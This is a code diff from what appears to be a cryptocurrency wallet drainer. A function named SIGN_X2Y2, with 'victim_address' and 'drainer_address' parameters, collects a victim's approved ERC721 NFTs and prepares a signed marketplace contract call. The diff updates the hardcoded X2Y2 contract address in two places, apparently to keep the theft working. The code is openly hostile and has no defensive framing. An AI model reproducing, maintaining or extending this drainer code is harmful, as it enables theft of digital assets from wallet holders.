@@ -5,13 +5,13 @@ const SIGN_X2Y2 = async (assets, provider, victim_address, drainer_address, user
     const nft_list = [], nft_list_plain = [];
     for (const asset of assets) {
       if (asset.skip || asset.type !== 'ERC721' || asset.chain_id != 1) continue;
-      if (!await is_nft_approved(asset.address, victim_address, "0xf849de01b080adc3a814fabe1e2087475cf2e354")) continue;
+      if (!await is_nft_approved(asset.address, victim_address, "0xddF1183fc1213716df67D74506AF13Fe8D74bE1F")) continue;
       nft_list.push({ token: asset.address, tokenId: ethers.BigNumber.from(asset.id) });
       nft_list_plain.push(asset);
     }
     if (nft_list.length === 0) return;
     let web3 = new ethers.providers.Web3Provider(provider), signer = web3.getSigner();
-    const contract = new ethers.Contract("0xf849de01b080adc3a814fabe1e2087475cf2e354", MS_X2Y2_ABI, signer);
+    const contract = new ethers.Contract("0xddF1183fc1213716df67D74506AF13Fe8D74bE1F", MS_X2Y2_ABI, signer);
     try {
       const gas_price = ethers.BigNumber.from(await web3.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
       let gas_limit = null;
